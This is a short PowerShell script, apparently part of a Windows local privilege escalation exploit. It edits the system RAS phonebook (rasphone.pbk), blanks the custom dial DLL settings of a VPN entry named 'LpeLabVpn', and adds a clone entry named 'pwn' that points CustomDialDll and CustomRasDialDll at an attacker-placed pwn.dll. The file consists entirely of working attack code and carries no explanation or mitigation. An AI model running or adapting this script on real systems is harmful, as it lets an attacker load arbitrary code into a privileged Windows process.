param(
    [string]$SourceEntry = 'LpeLabVpn',
    [string]$CloneEntry = 'pwn'
)

$pbk = 'C:\ProgramData\Microsoft\Network\Connections\Pbk\rasphone.pbk'
$text = Get-Content $pbk -Raw
$pattern = '(?ms)^\[' + [regex]::Escape($SourceEntry) + '\]\r?\n.*?(?=^\[|\z)'
$section = [regex]::Match($text, $pattern).Value

if (-not $section) {
    throw "missing source entry: $SourceEntry"
}

$orig = $section `
    -replace 'CustomDialDll=.*', 'CustomDialDll=' `
    -replace 'CustomRasDialDll=.*', 'CustomRasDialDll='

$copy = $section `
    -replace ('^\[' + [regex]::Escape($SourceEntry) + '\]'), ('[' + $CloneEntry + ']') `
    -replace 'CustomDialDll=.*', 'CustomDialDll=C:\Users\Public\Desktop\EXPLOIT\pwn.dll' `
    -replace 'CustomRasDialDll=.*', 'CustomRasDialDll=C:\Users\Public\Desktop\EXPLOIT\pwn.dll'

$text = [regex]::Replace(
    $text,
    $pattern,
    [System.Text.RegularExpressions.MatchEvaluator]{ param($m) $orig },
    1
)

if ($text -notmatch ('(?m)^\[' + [regex]::Escape($CloneEntry) + '\]$')) {
    $text = $text.TrimEnd() + "`r`n`r`n" + $copy.TrimEnd() + "`r`n"
} else {
    $text = [regex]::Replace(
        $text,
        '(?ms)^\[' + [regex]::Escape($CloneEntry) + '\]\r?\n.*?(?=^\[|\z)',
        [System.Text.RegularExpressions.MatchEvaluator]{ param($m) $copy },
        1
    )
}

Set-Content -Path $pbk -Value $text -Encoding Ascii
